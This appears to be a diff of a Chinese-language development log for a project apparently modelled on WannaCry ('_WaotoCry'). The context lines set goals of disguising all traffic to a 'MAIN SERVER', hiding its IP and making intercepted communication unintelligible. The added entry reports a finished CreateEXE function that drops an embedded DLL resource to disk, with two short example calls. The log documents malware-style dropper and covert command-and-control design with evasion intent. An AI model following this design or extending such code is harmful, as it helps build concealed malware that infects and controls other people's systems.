@@ -139,6 +139,32 @@ WAR:请注意若要对函数进行调用或者其他操作*add_double_data*及*B
 	和MAIN SERVER进行的一切交流必须要经过伪装以达到普通进程的目的。这里我说下此函数最后要做成的效果:
 	1. 不能暴露MAIN SERVER的IP地址	
 	2. 一切通讯被拦截后，无法推断PROCESS的意图
+
+
 	
 ## TIME:2021/11/12 17:54:15 完成对此模块的编写并成功PASS ##
-# 其他的等待明天补充....... (就是累死了)#
+
+
+----------
+
+----------
+
+> 2021/11/14 11:54:43 
+	
+	项目的RELEASE[文件释放函数]正式完成
+	此函数于11.13中午开始编写，足足卡了我一天的时间，不过好在终于写出来了
+	
+	函数介绍:
+	
+	函数名称:CreateEXE(char* strFilePath, int nResourceID, char* strResourceName)
+	需要用到的参数名称分别为:文件释放的位置，函数的VS2019资源名称(注:上面的写的是INT类型但是我里面用了MAKEINTRESOURCE进行转型),文件类型.
+	
+	Use MAKEINTRESOURCE:
+	_WaotoCry.get_process_dir= Get_Process_in_dir();
+	_WaotoCry.Proconn_data= CreateEXE(_WaotoCry.get_process_dir, IDR_DLL1, (char *)"DLL");
+	在Funtions.cpp中我写了一个获取当前目录的函数，这里用结构体中的_WaotoCry.Get_process_dir去接收数据
+	CreateEXE里面的就是正式调用
+
+
+----------
+
